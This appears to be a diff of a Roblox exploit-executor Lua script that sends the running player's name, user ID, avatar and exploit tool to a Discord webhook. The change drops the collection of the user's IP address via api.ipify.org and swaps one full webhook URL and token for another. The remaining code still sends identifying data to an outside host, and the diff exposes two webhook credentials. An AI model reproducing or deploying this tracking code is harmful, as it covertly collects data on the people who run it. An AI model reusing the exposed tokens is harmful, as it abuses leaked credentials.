@@ -1,4 +1,4 @@
-local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
+
 local HTTP_ = game:GetService('HttpService')
 local LPR = game:GetService('Players').LocalPlayer
 
@@ -21,7 +21,7 @@ local webhookcheck = exploitNames[is_sirhurt_closure] or exploitNames[pebc_execu
 local avatarData = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]
 local avatarURL = avatarData and avatarData['imageUrl'] or "Fallback URL"
 
-local url = "https://discord.com/api/webhooks/1257643612574060616/E5I8YXkyo3Hp9OSIu6RcStklDoHuFl9KqB-evt9B9aTfge0fKIbPaLYK_yditKNLT-D8"
+local url = "https://discord.com/api/webhooks/1257995130791526480/MqrXamSq0Wz_V4tm6CWt8-JwXX7tFaVGKfaTylTaqGEpESMXnU7drkOJk9wHoPXYcVgT"
 local data = {
     ["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
     ["avatar_url"] = avatarURL,
@@ -30,7 +30,7 @@ local data = {
             ["description"] = "Details:",
             ["fields"] = {
                 { name = "Exploit", value = webhookcheck, inline = true },
-                { name = "IP", value = ESD, inline = true },
+                
             },
             ["color"] = tonumber(0x7269da),
         }
